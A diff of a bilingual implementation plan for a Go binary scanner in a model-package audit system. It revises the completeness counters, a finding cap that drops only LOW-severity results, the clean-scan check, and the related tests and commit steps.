+	// a capped listing whose dropped lines can be blocking evidence. A pass over
+	// one of these is not evidence of absence, and ProvesCleanScan withholds it.
 	BoundedExecutable int `json:"bounded_executable,omitempty"`
-	// BoundedData counts files whose extraction was cut short and whose format
-	// is data on this platform. It is recorded because a reader should see it,
-	// and it does not withhold a verdict: a bounded tensor blob cannot run.
+	// BoundedData counts files whose evidence was cut short on a format that is
+	// data on this platform, by either bound. It is recorded because a reader
+	// should see it, and it does not withhold a verdict: a bounded tensor blob
+	// cannot run, and a capped listing on one can only have dropped free-string
+	// lines, which no blocking family reads.
 	BoundedData int `json:"bounded_data,omitempty"`
-	// Incomplete counts files that could not be examined at all.
+	// Incomplete counts paths the channel set out to examine and could not: a
+	// file that would not open, a file whose extraction failed, and a subtree the
+	// walk could not read. It is named for what the pass failed to see rather than
+	// for the file count, because an unreadable directory is not a file and still
+	// has to make the pass admit it looked at nothing.
 	Incomplete int `json:"incomplete,omitempty"`
-	// Truncated records that the finding cap was reached.
-	Truncated bool `json:"truncated,omitempty"`
-	// MaxFindings is the cap this pass ran under, carried into the report so that
-	// a reader who sees truncated can tell what it was truncated at without
-	// re-reading the scanner's configuration. It is provenance, not a second
-	// ceiling: MergeBinaryFindings does not reapply it to the joined list.
+	// Errored records that the pass could not run at all - the walk failed before
+	// it examined anything. It is a gap for the same reason Incomplete is: a pass
+	// that did not happen is not evidence of absence, and the alternative (an
+	// error out of the channel) would refuse the import through
+	// internal/controller/import_processing.go:642-660 without the report ever
+	// saying why.
+	Errored bool `json:"errored,omitempty"`
+	// FindingsCapped records that the finding cap dropped at least one finding.
+	//
+	// It is deliberately not the report's Truncated and is deliberately not folded
+	// into it. Reaching the cap is a listing budget being spent, not a look that
+	// did not happen, and the report's Truncated is one of the conditions
+	// ProvesCleanScan refuses on - folding this into it would make the channel
+	// refuse an import for having found too much. Only LOW findings are ever
+	// dropped (see ScanDirectory), and LOW blocks under neither the `assist` nor
+	// the `gate` policy - MEDIUM does block under `gate`, which is exactly why the
+	// cap keeps it - so nothing the cap drops could have blocked the import.
+	FindingsCapped bool `json:"findings_capped,omitempty"`
+	// FindingsDropped is how many LOW findings the cap dropped, so the count
+	// travels with the flag rather than being re-derived from a list that no
+	// longer has them.
+	FindingsDropped int `json:"findings_dropped,omitempty"`
+	// MaxFindings is the listing budget this pass ran under, carried into the
+	// report so that a reader who sees findings_capped can tell what it was capped
+	// at without re-reading the scanner's configuration. It is provenance, not a
+	// second ceiling: MergeBinaryFindings does not reapply it to the joined list.
 	MaxFindings int `json:"max_findings,omitempty"`
 }
 
@@ -3553,6 +8021,10 @@ type BinaryScanner struct {
 // caller could act on.
 func NewBinaryScanner(matcher *BinaryMatcher, cfg BinaryConfig) *BinaryScanner {
 	if matcher == nil {
+		// The discarded error would leave matcher nil and surface as a nil
+		// dereference at the first MatchAll rather than as a diagnosis, so the
+		// rule-table tests in binary_rules_test.go carry the weight of proving it
+		// cannot happen.
 		matcher, _ = NewBinaryMatcher()
 	}
 	return &BinaryScanner{matcher: matcher, cfg: normalizeBinaryConfig(cfg)}
@@ -3584,6 +8056,21 @@ func (s *BinaryScanner) ScanDirectory(dir string) (*BinaryScanResult, error) {
 
 	err = filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
+			// The walk could not read this path. Two shapes arrive here: an entry
+			// whose lstat failed (filepath.Walk passes info as nil, because there
+			// is no FileInfo to pass), and a directory whose entries would not
+			// list (info is the directory itself and err is the listing error).
+			// Either way there is nothing here to classify - a nil info has no
+			// mode and no bytes, and a directory has no bytes of its own.
+			//
+			// Returning nil is deliberate - one unreadable subtree must not abort
+			// the audit of the rest - but the skip must not be silent either. This
+			// is the count the classify-open and extraction failures below use, and
+			// it is what makes an unreadable subtree withhold the pass rather than
+			// leave a scan that looks read-and-clean. At the root it is the
+			// difference between a clean scan of zero files and a scan that admits
+			// it looked at nothing.
+			res.Summary.Incomplete++
 			return nil
 		}
 		if info.IsDir() {
@@ -3593,16 +8080,29 @@ func (s *BinaryScanner) ScanDirectory(dir string) (*BinaryScanResult, error) {
 			return nil
 		}
 		if !info.Mode().IsRegular() {
+			// A symlink, fifo, device or socket is not a file this channel reads,
+			// and it is deliberately not followed: filepath.Walk lstats each
+			// entry, so an entry that only points at a binary is skipped rather
+			// than read through. Following one would let a link out of the model
+			// directory pull in a file the package does not contain.
 			return nil
 		}
 
 		kind, headErr := s.classify(path)
 		if headErr != nil {
-			// A file whose head cannot be read is not claimed and not counted:
-			// it is not a binary this pass failed on, it is a file the pass
-			// could not even ask about. It is not silently dropped either - the
-			// source channel's own handling of it is unchanged, and the count of
-			// what this channel examined does not claim it.
+			// The walk reached the file and could not open it. That is a look
+			// that did not happen, so it is counted Incomplete and
+			// ProvesCleanScan withholds the pass - rather than being returned
+			// away as though the file were not there, which is the fail-open the
+			// completeness contract exists to close: a file the channel never
+			// read would otherwise be invisible to every downstream reader.
+			// The error is not propagated: one unreadable file must not abort the
+			// audit of the rest, so it reaches the report through the count
+			// instead of through the error path. It is also not added to Claimed,
+			// because Claimed means "classified as binary" and this file was
+			// never classified - so the source channel's own reading of it is
+			// left alone rather than suppressed on a guess.
+			res.Summary.Incomplete++
 			return nil
 		}
 		if kind == KindText {
@@ -3615,6 +8115,20 @@ func (s *BinaryScanner) ScanDirectory(dir string) (*BinaryScanResult, error) {
 		res.Summary.Kinds[string(kind)]++
 
 		if set.Err != nil {
+			// Extraction failed on a file that classify had already called binary:
+			// the archive would not open, the ELF would not parse, the stream would
+			// not decompress. That is a look that did not happen, and it is counted
+			// - never silently skipped, because a file the channel could not read
+			// and a file it decided not to read must not reach the report looking
+			// the same. The host has the shape to test it with: 21 truncated
+			// CUDA/MLX libraries, all of them under
+			// teellm/models/ollama/lib/ollama and none under
+			// deploy/guest-build/semgrep-payload/rootfs, which holds 88 .so*
+			// files and not one truncated one. Twenty are exactly 10485760 bytes
+			// on disk and the twenty-first is 10747904, with their section
+			// headers 34483600 to 751773392 bytes into the file, so elf.NewFile
+			// returns EOF. Counting is what makes such a file withhold the pass
+			// instead of passing as clean.
 			res.Summary.Incomplete++
 			return nil
 		}
@@ -3625,9 +8139,29 @@ func (s *BinaryScanner) ScanDirectory(dir string) (*BinaryScanResult, error) {
 				res.Summary.BoundedData++
 			}
 		} else if set.Bound.Listing {
-			// A capped listing is a data bound for every kind: the file was read,
-			// and what is missing is evidence lines rather than unexamined bytes.
-			res.Summary.BoundedData++
+			// A capped listing splits by kind for the same reason a bounded read
+			// does, but it is not the same loss. The cap is the matcher's input:
+			// ScanDirectory matches over set.Lines, and EvidenceSet.add returns
+			// before appending a line the cap refuses, so a dropped line is a line
+			// no rule was shown. That is why this bound cannot be treated as
+			// display-only, and why the decision belongs to the consumer that knows
+			// the file's kind.
+			//
+			// On an executable format the loss reaches the blocking evidence. Every
+			// blocking family reads a structural source - dynsym, needed, entropy,
+			// pickle - and only an executable format emits those lines, while the
+			// free-string families are all LOW. So a capped .so or .pt can have its
+			// blocking line dropped without a trace, and it is counted
+			// BoundedExecutable so the Task 10 fold withholds the pass.
+			//
+			// On a data kind the cap can only have dropped free-string lines, and no
+			// blocking family reads those, so it stays BoundedData: visible in the
+			// report, not a look that did not finish.
+			if isExecutableKind(kind) {
+				res.Summary.BoundedExecutable++
+			} else {
+				res.Summary.BoundedData++
+			}
 		}
 
 		matches := s.matcher.MatchAll(set.Lines)
@@ -3645,17 +8179,72 @@ func (s *BinaryScanner) ScanDirectory(dir string) (*BinaryScanResult, error) {
 	}
 
 	// Sorted before capping, for the same reason the semgrep adapter sorts before
-	// its cap: the cap keeps the first N, so a varying order would make a
-	// truncated pass keep a different set each time.
+	// its cap: the cap keeps the first N, so a varying order would make a capped
+	// pass keep a different set each time.
+	//
+	// The cap drops LOW findings and only LOW. A finding that can block the
+	// import under either supported policy is kept whether or not it fits the
+	// budget, and the list grows past MaxFindings instead. The keep rule below
+	// therefore names the one severity that cannot block and keeps everything
+	// else, rather than naming the severities that can - naming those would read
+	// one policy's answer into a decision both policies have to survive:
+	// `assist` withholds on HIGH alone, but `gate` withholds on HIGH or MEDIUM
+	// (internal/codeaudit/audit.go:298-309), and DYN_001 - MEDIUM in the shared
+	// table - refuses the import the moment an operator switches to `gate`.
+	// Dropping a blocking finding would turn a package that must be withheld
+	// into one that passes, which is the one failure a cap must not be
+	// able to cause, and an attacker aims at exactly it by padding a package with
+	// cheap LOW findings until the ones that block fall off the end of the list.
+	//
+	// The cost is real and is accepted: a crafted package can produce an
+	// unbounded number of MEDIUM findings, because none of them may be dropped.
+	// A report that grows is the safe direction to fail in; a report that is
+	// short by a blocking finding is not.
+	//
+	// Reaching the budget is recorded on the summary and nowhere else - it must
+	// not reach Report.Truncated, whose readers treat it as a completeness
+	// failure and refuse the import.
 	sortFindings(res.Findings)
 	if len(res.Findings) > s.cfg.MaxFindings {
-		res.Findings = res.Findings[:s.cfg.MaxFindings]
-		res.Summary.Truncated = true
+		kept := make([]Finding, 0, len(res.Findings))
+		dropped := 0
+		for _, f := range res.Findings {
+			// Written as "not LOW" rather than "is HIGH or MEDIUM" on purpose:
+			// the set that may be dropped has to be the one that cannot block,
+			// so anything the code does not positively know to be LOW is kept.
+			// rules.go declares no SeverityLow, so LOW is a bare string here and
+			// in the table that writes it. The rule table cannot produce the input
+			// that separates the two spellings - it writes only HIGH, MEDIUM and
+			// LOW - so the property is pinned by
+			// TestBinaryScannerCapKeepsAnUnknownSeverityPastTheBudget, which
+			// builds a matcher carrying a severity no table produces and requires
+			// it to survive the cap.
+			if len(kept) < s.cfg.MaxFindings || f.Severity != "LOW" {
+				kept = append(kept, f)
+				continue
+			}
+			dropped++
+		}
+		res.Findings = kept
+		if dropped > 0 {
+			res.Summary.FindingsCapped = true
+			res.Summary.FindingsDropped = dropped
+		}
 	}
 	return res, nil
 }
 
 // classify reads a file's head and decides how it should be read.
+//
+// A zero-byte file is not an error here. os.File.Read on an empty file returns
+// (0, io.EOF), so treating "err != nil && n == 0" as a failure would return
+// every empty regular file as an unreadable one - and ScanDirectory counts an
+// unreadable file as Incomplete, which withholds the pass. An empty __init__.py
+// is routine, so that would fail a legitimate package over a file with no bytes
+// to read. The branch below therefore distinguishes "could not open" (a real
+// error, returned) from "opened and is empty" (io.EOF with nothing read, not an
+// error), and lets ClassifyBinary decide the empty head the same way it decides
+// any other: an empty .py is KindText and is skipped, not counted.
 func (s *BinaryScanner) classify(path string) (BinaryKind, error) {
 	f, err := os.Open(path)
 	if err != nil {
@@ -3665,7 +8254,7 @@ func (s *BinaryScanner) classify(path string) (BinaryKind, error) {
 
 	head := make([]byte, sniffBytes)
 	n, err := f.Read(head)
-	if err != nil && n == 0 {
+	if err != nil && err != io.EOF {
 		return KindText, err
 	}
 	return ClassifyBinary(head[:n], path), nil
@@ -3718,11 +8307,7 @@ func renderEvidenceWindow(lines []EvidenceLine, start, end int) string {
 	}
 	return joinTrimmed(out)
 }
-```
 
-`joinTrimmed` 是个小工具，追加到 `binary_scanner.go`：
-
-```go
 // joinTrimmed joins rendered evidence lines, keeping the same trimming the
 // source arms' contextWindow applies.
 func joinTrimmed(lines []string) string {
@@ -3737,11 +8322,39 @@ func joinTrimmed(lines []string) string {
 }
 ```
 
-import 块补 `"strings"`。
+> **陷阱：两个通道的封顶不是同一个安全模型，别把它们"统一"起来。** 文本通道的封顶是**按位置丢**的——`scanner.go:97-100` 在走的过程中把 `findings` 截到 `MaxFindings`、置 `truncated = true`、`return filepath.SkipAll`（第二处同形的在 `scanner.go:298-301`，semgrep 适配器在 `semgrep_engine.go:239-243` 置同一个 `truncated`）。它**安全**，是因为任何一次丢弃都会置 `truncated`，而 `truncated` 被 `rules.go:141-150` 的 `ProvesCleanScan` 折进去（读 `!r.Truncated` 的那一行是 `rules.go:146`；`rules.go:126-134` 是它的 doc comment，别把注释区当读取点）、并在 `scanner.go:231`、`verifier.go:188`/`verifier.go:235`、`audit.go:354`/`audit.go:314-316` 处被 AND 起来——所以文本通道丢一个 finding 的后果是"这个包被扣下"，不是"这个包通过"。
+>
+> **二进制通道故意不是这样**：下面的 cap 只裁剪**报告里的清单**，`FindingsCapped`/`FindingsDropped` 按 Task 10 的设计**不进** `ProvesCleanScan`，也就是说二进制通道丢一个 finding **不会**让包被扣下。它的安全因此**完全落在**这条 keep 规则上：cap 只花 **LOW** 这一档，保住 **HIGH 与 MEDIUM**，并对未知严重级 fail-closed（所以写的是 `f.Severity != "LOW"` 而不是 `f.Severity == "HIGH" || f.Severity == "MEDIUM"`）。写 `!= "LOW"` 的理由是：**能被丢的那一档必须恰好是"不能阻断"的那一档**，代码不确知是 LOW 的东西都要留下——`rules.go` 里根本没有 `SeverityLow` 常量，`"LOW"` 是个裸字符串，`gate` 下 MEDIUM 一样阻断（`audit.go:298-309`），而 `DYN_001` 正是 MEDIUM。
+>
+> **为什么"统一"会拒掉合法包**：二进制证据产生的 finding 数量远多于文本通道——一个 `.so` 的动态符号表一次就能出几十条。若照文本通道的样子让"触顶"也去**扣包**（把 `FindingsCapped` 折进 `ProvesCleanScan`、或让二进制臂也按位置丢并在丢时置 `truncated`），那么任何产出超过 `MaxFindings` 条 finding 的**合法**包（一个正常的加速库就能做到）都会被拒绝导入。所以这两个通道**必须**保持不同的封顶语义；改其中一边时要同时看懂另一边——把 `FindingsCapped` 折进完整性判定是拒合法包，把 keep 规则放宽成"只保 HIGH"（assist 视角）则是放走 `gate` 下本应阻断的 MEDIUM。`TestBinaryScannerCapKeepsAMediumFindingBeyondTheBudget` 钉的就是后一条。
 
-- [ ] **Step 4: 补 `EngineNameBinary` 常量**
+`joinTrimmed`（以及它用到的 `"strings"` import）已包含在上面那份 `binary_scanner.go` 的完整文件里；本任务不再单列这一段追加。
 
-修改 `internal/codeaudit/cpg_analysis.go:14` 旁边，在 `EngineNameCPG` 声明后追加：
+- [ ] **Step 4: 补 `Finding` 的二进制字段与 `EngineNameBinary` 常量**
+
+先修改 `internal/codeaudit/rules.go`，在 `Finding` 结构体末尾（`Engine` 字段之后）追加这三个字段：
+
+```go
+	// BinaryKind names the reading the binary channel applied to File: "elf",
+	// "archive", "pickle", "compressed", "numpy" or "raw". Empty for a finding
+	// the source channel produced, which is what makes the two kinds of finding
+	// distinguishable in a merged list without consulting the engine field.
+	BinaryKind string `json:"binary_kind,omitempty"`
+	// EvidenceSource names the evidence a binary finding came from: a dynamic
+	// symbol, a DT_NEEDED library, a string literal, a section summary, an
+	// entropy verdict, a container member or a pickle target. It is what tells a
+	// reader how much weight the finding carries - a symbol name is a capability
+	// the binary has, a string literal is a thing it says.
+	EvidenceSource string `json:"evidence_source,omitempty"`
+	// BinaryOffset is the byte offset in File the evidence was read at, for the
+	// evidence that has one. Symbol and section evidence carries zero: it names
+	// a property of the file rather than a byte range in it.
+	BinaryOffset int64 `json:"binary_offset,omitempty"`
+```
+
+> 这三个字段归本任务，不归 Task 10：Step 1 的测试与 `binaryFinding` 都要用它们，声明必须落在**第一个使用它们的任务**里，包才在本任务的提交点编译。`Report.Binary` 仍留在 Task 10——第一个读它的 `ProvesCleanScan` 在那边。
+
+再修改 `internal/codeaudit/cpg_analysis.go:14` 旁边，在 `EngineNameCPG` 声明后追加：
 
 ```go
 // EngineNameBinary names the binary channel in the Engine field of a finding it
@@ -3754,16 +8367,16 @@ const EngineNameBinary = "binary"
 - [ ] **Step 5: 跑测试确认通过**
 
 ```bash
-go test ./internal/codeaudit/ -run TestBinaryScanner -v 2>&1 | tail -20
+go test ./internal/codeaudit/ -run 'TestBinaryScanner|TestSortFindings' -v 2>&1 | tail -20
 ```
 
-预期全 PASS。
+预期全 PASS。`TestSortFindings` 也在这一次运行里：它钉的是 `ScanDirectory` 调用的那个排序本身，而扫描层的用例构造不出乱序（见 `TestBinaryScannerIsDeterministic` 的注释），所以它必须被显式选进来。
 
 - [ ] **Step 6: 提交**
 
 ```bash
 gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
-git add internal/codeaudit/binary_scanner.go internal/codeaudit/binary_scanner_test.go internal/codeaudit/cpg_analysis.go
+git add internal/codeaudit/binary_scanner.go internal/codeaudit/binary_scanner_test.go internal/codeaudit/rules.go internal/codeaudit/cpg_analysis.go
 git commit -m "feat(audit): add the binary scanner with deterministic ordering and finding cap"
 ```
 
@@ -3785,12 +8398,17 @@ git commit -m "feat(audit): add the binary scanner with deterministic ordering a
 // classes are treated differently on purpose: a bounded executable is a look
 // that did not finish, a bounded data file is a look that finished on as much as
 // there was reason to read.
+//
+// The finding cap is in the table as a case that does NOT withhold, because that
+// is the property being pinned: reaching the cap means the channel found more
+// than its listing budget, which is not the same fact as a look that did not
+// happen, and treating it as one would refuse an import for having findings.
 func TestProvesCleanScanWithholdsOnBinaryGaps(t *testing.T) {
 	base := func(sum BinaryScanSummary) *Report {
 		return &Report{
-			ScanComplete: true,
+			ScanComplete:    true,
 			ProcessExitCode: 0,
-			Binary: &sum,
+			Binary:          &sum,
 		}
 	}
 	cases := []struct {
@@ -3802,9 +8420,10 @@ func TestProvesCleanScanWithholdsOnBinaryGaps(t *testing.T) {
 		{"files examined, nothing bounded", BinaryScanSummary{FilesCount: 3}, true},
 		{"a bounded data file is visible but does not withhold", BinaryScanSummary{FilesCount: 3, BoundedData: 1}, true},
 		{"a capped listing is a data bound", BinaryScanSummary{FilesCount: 3, BoundedData: 2}, true},
+		{"the finding cap does not withhold", BinaryScanSummary{FilesCount: 3, FindingsCapped: true, FindingsDropped: 4}, true},
 		{"a bounded executable withholds", BinaryScanSummary{FilesCount: 3, BoundedExecutable: 1}, false},
 		{"an unexamined file withholds", BinaryScanSummary{FilesCount: 3, Incomplete: 1}, false},
-		{"the finding cap withholds", BinaryScanSummary{FilesCount: 3, Truncated: true}, false},
+		{"a pass that could not run withholds", BinaryScanSummary{Errored: true}, false},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -3838,25 +8457,7 @@ go test ./internal/codeaudit/ -run 'TestProvesCleanScan' 2>&1 | head -10
 
 修改 `internal/codeaudit/rules.go`。
 
-在 `Finding` 结构体末尾（`Engine` 字段之后）追加：
-
-```go
-	// BinaryKind names the reading the binary channel applied to File: "elf",
-	// "archive", "pickle", "compressed", "numpy" or "raw". Empty for a finding
-	// the source channel produced, which is what makes the two kinds of finding
-	// distinguishable in a merged list without consulting the engine field.
-	BinaryKind string `json:"binary_kind,omitempty"`
-	// EvidenceSource names the evidence a binary finding came from: a dynamic
-	// symbol, a DT_NEEDED library, a string literal, a section summary, an
-	// entropy verdict, a container member or a pickle target. It is what tells a
-	// reader how much weight the finding carries - a symbol name is a capability
-	// the binary has, a string literal is a thing it says.
-	EvidenceSource string `json:"evidence_source,omitempty"`
-	// BinaryOffset is the byte offset in File the evidence was read at, for the
-	// evidence that has one. Symbol and section evidence carries zero: it names
-	// a property of the file rather than a byte range in it.
-	BinaryOffset int64 `json:"binary_offset,omitempty"`
-```
+`Finding` 的三个二进制字段（`BinaryKind`/`EvidenceSource`/`BinaryOffset`）在 Task 9 就已追加——那是第一个使用它们的任务，本任务不再重复。本任务只加 `Report` 上的字段与折入。
 
 在 `Report` 结构体末尾（`ProcessExitCode` 之后）追加：
 
@@ -3865,11 +8466,21 @@ go test ./internal/codeaudit/ -run 'TestProvesCleanScan' 2>&1 | head -10
 	// the channel did not run, which is what a deployment that turned it off
 	// produces and what every report predating it carries.
 	//
+	// The fold below applies only to a non-nil summary, so a caller that stamps
+	// a zero-valued summary reads as clean rather than as a gap. Only a pass that
+	// actually ran the channel may set it, and on this wiring the audit path is
+	// the only writer: Task 12 copies it into AuditMetadata and nothing else
+	// constructs one. A writer placed ahead of the channel would turn "did not
+	// look" into "looked and found nothing", which is the one failure this fold
+	// exists to prevent.
+	//
 	// It lives on the Report rather than on the AuditReport because
 	// ProvesCleanScan is what has to read it, and the whole point of that method
 	// is that every way of not having looked withholds the pass in one place.
 	Binary *BinaryScanSummary `json:"binary,omitempty"`
 ```
+
+> **指针：`Report.Binary` 只是扫描期的账，出报告时还要**另镜像一份**进 `AuditMetadata`（`audit.go:24` 的 `scan_metadata`），由 **Task 12** 承担。这条指针不能省，因为**二进制不完整性会独自扣包**——`audit.go:354` 的 `sp := scanReport.Passed && scanReport.ProvesCleanScan()`，而离场报告的 `AuditMetadata`（`audit.go:24`、组装在 `audit.go:411`）今天**不含任何二进制字段**：一旦折入扣了包而报告里没有缺口字段，operator 只能看到"包被扣下"，看不到"哪个文件没看完"，这正是 `failclosed_test.go:155` 那条"元数据存在就是为了说明是否跑完"的先例要避免的形状。Task 12 那节把镜像**必须携带 `Incomplete`/`BoundedExecutable`/`Errored` 三个缺口字段（不能只带计数）**写成显式要求，并配了钉住它的测试。
 
 修改 `ProvesCleanScan`：
 
@@ -3890,11 +8501,18 @@ func (r *Report) ProvesCleanScan() bool {
 	// function that answers "did the scan look", and a check applied anywhere
 	// else is a check a later recomputation can drop.
 	//
-	// BoundedData is deliberately not read. A tensor blob whose listing was
-	// capped is a file that was read; a shared object whose sections were not is
-	// a file that was not, and only the second is a look that did not happen.
+	// BoundedData and FindingsCapped are deliberately not read. BoundedData is a
+	// cut that landed on a kind which cannot execute - a raw blob or a tensor file
+	// - whether the cut was structural or a capped listing. Nothing on this
+	// platform runs such a file, and no blocking family reads the free-string
+	// source that a capped listing can drop from one, so a cut there cannot be
+	// hiding a blocking finding. FindingsCapped is a different thing again: it
+	// records the LOW findings the finding cap dropped, and LOW does not block
+	// under either policy (assist withholds on HIGH, gate on HIGH or MEDIUM).
+	// Neither is a look that did not happen, and only a look that did not happen
+	// can make a pass a claim about absence.
 	if b := r.Binary; b != nil {
-		if b.BoundedExecutable > 0 || b.Incomplete > 0 || b.Truncated {
+		if b.BoundedExecutable > 0 || b.Incomplete > 0 || b.Errored {
 			return false
 		}
 	}
@@ -3902,13 +8520,17 @@ func (r *Report) ProvesCleanScan() bool {
 }
 ```
 
+> **陷阱：两个通道的封顶不是同一个安全模型，别把二进制的 `FindingsCapped` 折进这个判定。** 文本通道的封顶是**按位置丢** finding 的（`scanner.go:97-100` 的截断加 `return filepath.SkipAll`、`scanner.go:298-301` 的同形第二处、`semgrep_engine.go:239-243`），它**安全**是因为任何一次丢弃都会置 `truncated = true`，而 `truncated` 正是这个函数（`rules.go:141-150`；读 `!r.Truncated` 的是 `rules.go:146`，`rules.go:126-134` 只是 doc comment）读的完整性字段之一——文本通道丢一个 finding 的代价是"包被扣下"（`scanner.go:231`、`verifier.go:188`/`verifier.go:235`、`audit.go:354`/`audit.go:314-316` 把这条 AND 链起来）。
+>
+> **二进制通道故意不这样**：它裁剪的只是**报告里的清单**，`FindingsCapped`/`FindingsDropped` **故意不折进**这里（上面 `BoundedData` 与 `FindingsCapped` 都被明确排除在读取之外，这是刻意的），所以二进制通道丢一个 finding 不扣包。这正是"把两个通道的封顶统一起来会拒掉合法包"这句话的落点——**二进制证据产生的 finding 数量远多于文本通道**（一个 `.so` 的动态符号表一次就能出几十条），如果照文本通道的样子让"触顶"也去扣包，那么任何产出超过 `MaxFindings` 条 finding 的**合法**包（一个正常的加速库就能做到）都会被拒绝导入。所以二进制通道的安全**不靠**这个折入，而**完全**靠 Task 9 那条 keep 规则：cap 只花 LOW 一档、保住 HIGH **和** MEDIUM、对未知严重级 fail-closed。改这一对设计时要两边一起看——把 `FindingsCapped` 折进这里是拒合法包，把 keep 规则放宽成"只保 HIGH"则是在 `gate` 下放走 MEDIUM 阻断 finding。
+
 - [ ] **Step 4: 跑测试确认通过**
 
 ```bash
-go test ./internal/codeaudit/ -run 'TestProvesCleanScan|TestFailClosed|TestReportFields' -v 2>&1 | tail -20
+go test ./internal/codeaudit/ -run 'TestProvesCleanScan|TestEveryEngineProvesACleanScanForANormalScan|TestAHighFinding|TestIncomplete|TestTruncated|TestRecomputeReportPassed|TestScanMetadata|TestScanDirectory' -v 2>&1 | tail -30
 ```
 
-预期全 PASS。已有的 fail-closed 测试必须保持通过——它们是这次改动的回归网。
+预期全 PASS。已有的 fail-closed 测试必须保持通过——它们是这次改动的回归网。这里按**实际存在的函数名**逐一选中：`failclosed_test.go` 里是 `TestProvesCleanScan*`、**`TestEveryEngineProvesACleanScanForANormalScan`（`failclosed_test.go:189`，包内**唯一**一条直接断言 `ProvesCleanScan()` 返回 true 的用例，而这次改动改的正是这个函数的正向——少了它，回归网里没有一条会在"折入写反、把正常扫描也扣下"时变红）**、`TestAHighFindingStillBlocksAnIncompleteScan`、`TestIncompleteScanCannotPassTheAuditConclusion`、`TestTruncatedScanCannotPassTheAuditConclusion`、`TestRecomputeReportPassedWithholdsPassForAnIncompleteScan`、`TestScanMetadataCarriesIncompletenessToTheReportThatLeaves`；`TestScanDirectoryWithLines` 在 **`audit_test.go:539`**（不在 `report_fields_test.go`——`-run TestScanDirectory` 这个模式照样选中它，只是归属别写错）。**不要写成 `TestFailClosed`/`TestReportFields` 这样的前缀**——包里的测试不叫这两个名字，那样的 `-run` 只选中 `TestProvesCleanScan*` 一条，等于把回归网晾在一边。
 
 - [ ] **Step 5: 提交**
 
@@ -3926,6 +8548,8 @@ git commit -m "feat(audit): fold binary completeness into the clean-scan proof"
 - Modify: `internal/codeaudit/audit.go`
 - Test: `internal/codeaudit/audit_test.go`
 
+> **前置条件：Task 10 必须先提交。** 本任务的 `MergeBinaryFindings` 与它的四条测试都读写 `Report.Binary`（`*BinaryScanSummary`），并且依赖 `ProvesCleanScan` 折入那个 summary 的缺口字段——这两样**都是 Task 10 加的**。HEAD 上 `Report` 的字段到 `ProcessExitCode` 为止（`rules.go:75-111`），没有任何二进制字段；`ProvesCleanScan`（`rules.go:141-150`）今天也只读源码臂那五个字段，不读任何二进制 summary。所以先派本任务的话，Step 2 的编译错误会是**两个**：`undefined: MergeBinaryFindings` **和** `unknown field Binary in struct literal of type Report`，而不是本步预测的那一个——看到两个错误时先确认 Task 10 落地了没有，不要去改测试。
+
 - [ ] **Step 1: 写失败测试**
 
 追加到 `internal/codeaudit/audit_test.go`：
@@ -3933,25 +8557,36 @@ git commit -m "feat(audit): fold binary completeness into the clean-scan proof"
 ```go
 // TestMergeBinaryFindingsAppendsAndRecomputes pins the three things the merge
 // does at once: the binary findings join the list, the static counts are
-// recomputed from the joined list, and the binary summary reaches the report so
-// that ProvesCleanScan can read it.
+// recomputed from the joined list, and the binary summary is attached *before*
+// that recomputation so that ProvesCleanScan reads it.
+//
+// The fixture is built so the last assertion can fail. Both findings are MEDIUM,
+// which under the default `assist` policy does not block, so the report passes
+// before the merge and would still pass after it if the summary arrived too late
+// - the only thing that can withdraw the pass is BoundedExecutable, and only if
+// the summary was there when recomputeReportPassed ran. A fixture with a HIGH in
+// it would hold this assertion whichever order the merge used, and would pin
+// nothing.
 func TestMergeBinaryFindingsAppendsAndRecomputes(t *testing.T) {
 	report := &Report{
 		ScanComplete: true,
 		FilesCount:   1,
 		Findings: []Finding{
-			{File: "/m/clean.py", Line: 1, RuleID: "NET_001", Severity: SeverityHigh},
+			{File: "/m/clean.py", Line: 1, RuleID: "ENV_001", Severity: SeverityMedium},
 		},
 	}
 	recomputeReportPassed(report, false)
-	if report.Passed {
-		t.Fatal("fixture is wrong: a HIGH finding must already block")
+	if !report.Passed {
+		t.Fatal("fixture is wrong: a MEDIUM-only report passes under assist")
+	}
+	if report.MediumCount != 1 {
+		t.Fatalf("fixture is wrong: MediumCount = %d, want 1", report.MediumCount)
 	}
 
 	res := &BinaryScanResult{
-		Claimed:     []string{"/m/libevil.so"},
+		Claimed: []string{"/m/libevil.so"},
 		Findings: []Finding{
-			{File: "/m/libevil.so", Line: 4, RuleID: "NET_002", Severity: SeverityHigh, Engine: EngineNameBinary},
+			{File: "/m/libevil.so", Line: 4, RuleID: "DYN_001", Severity: SeverityMedium, Engine: EngineNameBinary},
 		},
 		Summary: BinaryScanSummary{FilesCount: 1, BoundedExecutable: 1},
 	}
@@ -3961,11 +8596,17 @@ func TestMergeBinaryFindingsAppendsAndRecomputes(t *testing.T) {
 	if len(report.Findings) != 2 {
 		t.Fatalf("len(Findings) = %d, want 2", len(report.Findings))
 	}
+	if !containsFileFinding(report.Findings, "/m/libevil.so", "DYN_001") {
+		t.Error("the binary finding did not join the list")
+	}
 	if report.Binary == nil {
 		t.Fatal("report.Binary is nil; the completeness summary did not reach the report")
 	}
+	if report.MediumCount != 2 {
+		t.Errorf("MediumCount = %d, want 2: the counts were not recomputed from the joined list", report.MediumCount)
+	}
 	if report.Passed {
-		t.Error("Passed = true, want false: the binary scan was bounded and BoundedExecutable withholds the pass")
+		t.Error("Passed = true: the summary was attached after the recomputation, so ProvesCleanScan never saw BoundedExecutable")
 	}
 }
 
@@ -3983,9 +8624,9 @@ func TestMergeBinaryFindingsDropsTextFindingsForBinaryFiles(t *testing.T) {
 		},
 	}
 	res := &BinaryScanResult{
-		Claimed:     []string{"/m/evil.py"},
+		Claimed: []string{"/m/evil.py"},
 		Findings: []Finding{
-			{File: "/m/evil.py", Line: 1, RuleID: "BIN_001", Severity: SeverityMedium, Engine: EngineNameBinary},
+			{File: "/m/evil.py", Line: 1, RuleID: "BIN_001", Severity: SeverityHigh, Engine: EngineNameBinary},
 		},
 	}
 
@@ -4012,12 +8653,18 @@ func TestMergeBinaryFindingsDropsTextFindingsForBinaryFiles(t *testing.T) {
 // apply a ceiling to the joined list.
 //
 // Each channel caps its own findings before the merge. A second cap here would
-// couple them: it would let a large source arm evict binary findings by path
-// order, and - because reaching a cap sets Truncated, and Truncated fails
-// ProvesCleanScan - it would newly block and delete a package that passed before
-// the binary channel existed. The fixture is the smallest one that shows the
-// difference: three source findings, one binary finding, and a source arm whose
-// own cap was three.
+// couple them: it would choose which findings to drop by path order rather than
